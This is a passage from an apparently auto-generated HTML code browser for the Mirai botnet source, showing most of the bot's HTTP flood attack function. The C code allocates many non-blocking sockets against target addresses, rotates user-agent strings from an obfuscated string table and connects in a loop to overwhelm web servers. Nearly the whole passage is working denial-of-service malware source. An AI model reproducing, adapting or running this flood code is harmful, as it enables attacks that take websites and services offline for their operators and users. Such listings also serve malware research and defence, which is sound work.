href="mirai_2bot_2util_8c_source.html#l00087">util_atoi()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00132">util_itoa()</a>, <a class="el" href="loader_2src_2util_8c_source.html#l00111">util_memsearch()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00047">util_strcmp()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00063">util_strcpy()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00209">util_stristr()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00021">util_strlen()</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00031">util_strncmp()</a>, and <a class="el" href="mirai_2bot_2util_8c_source.html#l00080">util_zero()</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;{</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    <span class="keywordtype">int</span> i, ii, rfd, ret = 0;</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    <span class="keyword">struct </span><a class="code" href="structattack__http__state.html">attack_http_state</a> *http_table = NULL;</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;    <span class="keywordtype">char</span> *<a class="code" href="structattack__http__state.html#a5b3a33cc244ec2615f05092657be65f5">postdata</a> = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, <a class="code" href="attack_8h.html#aa069ca3abf2026e0e48d8f06ad47437c">ATK_OPT_POST_DATA</a>, NULL);</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    <span class="keywordtype">char</span> *<a class="code" href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">method</a> = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac0ce7d29746181bb91fd95569c625f9f">ATK_OPT_METHOD</a>, <span class="stringliteral">&quot;GET&quot;</span>);</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    <span class="keywordtype">char</span> *<a class="code" href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a> = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4c326567294cc6655e9f6a380c7f736f">ATK_OPT_DOMAIN</a>, NULL);</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    <span class="keywordtype">char</span> *<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> = <a class="code" href="attack_8c.html#a79b03d7c093d14a1640b2e5bcf2c3c38">attack_get_opt_str</a>(opts_len, opts, <a class="code" href="attack_8h.html#af614bdd4374d1ecf0ba5bb48a8cb4e65">ATK_OPT_PATH</a>, <span class="stringliteral">&quot;/&quot;</span>);</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;    <span class="keywordtype">int</span> sockets = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab4c96458d5b368729fc078a755d9b70d">ATK_OPT_CONNS</a>, 1);</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 80);</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;    <span class="keywordtype">char</span> generic_memes[10241] = {0};</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;    <span class="keywordflow">if</span> (domain == NULL || path == NULL)</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(path) &gt; <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a> - 1)</div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;</div><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(domain) &gt; <a class="code" href="attack_8h.html#af13bc0acf7afcddfcc5098dbe5c343aa">HTTP_DOMAIN_MAX</a> - 1)</div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(method) &gt; 9)</div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;</div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;    <span class="comment">// BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?</span></div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;    <span class="comment">// yes it would segfault but we only update the values if they are not already uppercase.</span></div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;    <span class="comment">// if the method is lowercase and its passed from the CNC we can update that memory no problem</span></div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;    <span class="keywordflow">for</span> (ii = 0; ii &lt; <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(method); ii++)</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;        <span class="keywordflow">if</span> (method[ii] &gt;= <span class="charliteral">&#39;a&#39;</span> &amp;&amp; method[ii] &lt;= <span class="charliteral">&#39;z&#39;</span>)</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;            method[ii] -= 32;</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;    <span class="keywordflow">if</span> (sockets &gt; <a class="code" href="attack_8h.html#aaed58b5e52e808b4237035050183f315">HTTP_CONNECTION_MAX</a>)</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;        sockets = <a class="code" href="attack_8h.html#aaed58b5e52e808b4237035050183f315">HTTP_CONNECTION_MAX</a>;</div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;    <span class="comment">// unlock frequently used strings</span></div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#aa5dbdc8879922e71d9a920cc8bc91657">TABLE_ATK_SET_COOKIE</a>);</div><div class="line"><a name="l00063"></a><span class="lineno">   63</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a56932ae77dd79f16be9f28341dfd438f">TABLE_ATK_REFRESH_HDR</a>);</div><div class="line"><a name="l00064"></a><span class="lineno">   64</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a0fcf8e231e646aaed0d7fcb495da1935">TABLE_ATK_LOCATION_HDR</a>);</div><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a31f1bf8dcf162592001058f12362eb55">TABLE_ATK_SET_COOKIE_HDR</a>);</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a98de50549fdb839f2ba413f44e0d3e6a">TABLE_ATK_CONTENT_LENGTH_HDR</a>);</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a6bb03316c5d32d6053734ac6ceec2d82">TABLE_ATK_TRANSFER_ENCODING_HDR</a>);</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a89772e3bed797cb16a658f935bc8c37b">TABLE_ATK_CHUNKED</a>);</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a1665384941722febe6d2a8b1e58655be">TABLE_ATK_KEEP_ALIVE_HDR</a>);</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#afdae87bf33d9c2f2407b37fab6e91628">TABLE_ATK_CONNECTION_HDR</a>);</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a3e6171ef594c03bf2526e8d43c9fbdb3">TABLE_ATK_DOSARREST</a>);</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;    <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a260fbfdad3b4d569ea5bf904538e0628">TABLE_ATK_CLOUDFLARE_NGINX</a>);</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;    http_table = calloc(sockets, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <a class="code" href="structattack__http__state.html">attack_http_state</a>));</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; sockets; i++)</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;    {</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;        http_table[i].<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;        http_table[i].<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = -1;</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;        http_table[i].<a class="code" href="structattack__http__state.html#a3261c180242b8f5e1811e25c1b4c7f68">dst_addr</a> = targs[i % targs_len].addr;</div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].path, path);</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;        <span class="keywordflow">if</span> (http_table[i].path[0] != <span class="charliteral">&#39;/&#39;</span>)</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;        {</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;            memmove(http_table[i].path + 1, http_table[i].path, <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(http_table[i].path));</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;            http_table[i].<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a>[0] = <span class="charliteral">&#39;/&#39;</span>;</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;        }</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].<a class="code" href="structattack__http__state.html#a8119cf4b9557d805cd226410a206391a">orig_method</a>, method);</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].method, method);</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].domain, domain);</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;</div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;        <span class="keywordflow">if</span> (targs[i % targs_len].netmask &lt; 32)</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;            http_table[i].<a class="code" href="structattack__http__state.html#a3261c180242b8f5e1811e25c1b4c7f68">dst_addr</a> = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i % targs_len].netmask));</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;        <span class="keywordflow">switch</span>(<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() % 5)</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;        {</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;            <span class="keywordflow">case</span> 0:</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#ab6dfc5137f16deb497a130057eb69830">TABLE_HTTP_ONE</a>);</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].<a class="code" href="structattack__http__state.html#a3809782e42bb4bc6df9e5af0e054d65e">user_agent</a>, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#ab6dfc5137f16deb497a130057eb69830">TABLE_HTTP_ONE</a>, NULL));</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#ab6dfc5137f16deb497a130057eb69830">TABLE_HTTP_ONE</a>);</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;            <span class="keywordflow">case</span> 1:</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#a99cbff873fe834c6ee8c966fd88c6bdc">TABLE_HTTP_TWO</a>);</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].user_agent, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a99cbff873fe834c6ee8c966fd88c6bdc">TABLE_HTTP_TWO</a>, NULL));</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#a99cbff873fe834c6ee8c966fd88c6bdc">TABLE_HTTP_TWO</a>);</div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;            <span class="keywordflow">case</span> 2:</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#af1d5bc3f0c5007adc2bb968ab21fda6c">TABLE_HTTP_THREE</a>);</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].user_agent, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#af1d5bc3f0c5007adc2bb968ab21fda6c">TABLE_HTTP_THREE</a>, NULL));</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#af1d5bc3f0c5007adc2bb968ab21fda6c">TABLE_HTTP_THREE</a>);</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;            <span class="keywordflow">case</span> 3:</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#aa990a86d534b2e4181148de832c921c5">TABLE_HTTP_FOUR</a>);</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].user_agent, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#aa990a86d534b2e4181148de832c921c5">TABLE_HTTP_FOUR</a>, NULL));</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#aa990a86d534b2e4181148de832c921c5">TABLE_HTTP_FOUR</a>);</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;            <span class="keywordflow">case</span> 4:</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;                <a class="code" href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a>(<a class="code" href="table_8h.html#ac1a27c372d2f9a9c055a1bc0196c8764">TABLE_HTTP_FIVE</a>);</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;                <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].user_agent, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#ac1a27c372d2f9a9c055a1bc0196c8764">TABLE_HTTP_FIVE</a>, NULL));</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;                <a class="code" href="table_8c.html#a0c03e9a9ebea1c0e6b98b969b56825b2">table_lock_val</a>(<a class="code" href="table_8h.html#ac1a27c372d2f9a9c055a1bc0196c8764">TABLE_HTTP_FIVE</a>);</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;        }</div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(http_table[i].path, path);</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;    }</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;</div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;    <span class="keywordflow">while</span>(<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;    {</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;        fd_set fdset_rd, fdset_wr;</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;        <span class="keywordtype">int</span> mfd = 0, nfds;</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;        <span class="keyword">struct </span>timeval tim;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;        <span class="keyword">struct </span><a class="code" href="structattack__http__state.html">attack_http_state</a> *conn;</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;        uint32_t fake_time = time(NULL);</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;        FD_ZERO(&amp;fdset_rd);</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;        FD_ZERO(&amp;fdset_wr);</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; sockets; i++)</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;        {</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;            conn = &amp;(http_table[i]);</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a>)</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;            {</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a365269c0f55832182c8a76236ea80c18">keepalive</a>)</div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#aff008d93b76d40a67da697001e176f6b">HTTP_CONN_SEND</a>;</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;                <span class="keywordflow">else</span></div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;                    conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>;</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;            }</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#a61e0fc173a48e31ab11b5d4e54d751bd">HTTP_CONN_INIT</a>)</div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;            {</div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;                <span class="keyword">struct </span>sockaddr_in addr = {0};</div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> != -1)</div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;                    <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;                <span class="keywordflow">if</span> ((conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_STREAM, 0)) == -1)</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;                    <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;                fcntl(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, F_SETFL, O_NONBLOCK | fcntl(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, F_GETFL, 0));</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;                ii = 65535;</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;                setsockopt(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, 0, SO_RCVBUF, &amp;ii ,<span class="keyword">sizeof</span>(<span class="keywordtype">int</span>));</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;                addr.sin_family = AF_INET;</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;                addr.sin_addr.s_addr = conn-&gt;<a class="code" href="structattack__http__state.html#a3261c180242b8f5e1811e25c1b4c7f68">dst_addr</a>;</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;                addr.sin_port = htons(dport);</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a57ddd53019ddf55a509aae9c74e2ecfa">last_recv</a> = fake_time;</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;                conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a17d0f5a78e9f64122185611485c18222">HTTP_CONN_CONNECTING</a>;</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;                <a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, (<span class="keyword">struct</span> sockaddr *)&amp;addr, sizeof (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;                printf(<span class="stringliteral">&quot;[http flood] fd%d started connect\n&quot;</span>, conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>);</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;                FD_SET(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, &amp;fdset_wr);</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> &gt; mfd)</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;                    mfd = conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a> + 1;</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;            }</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" 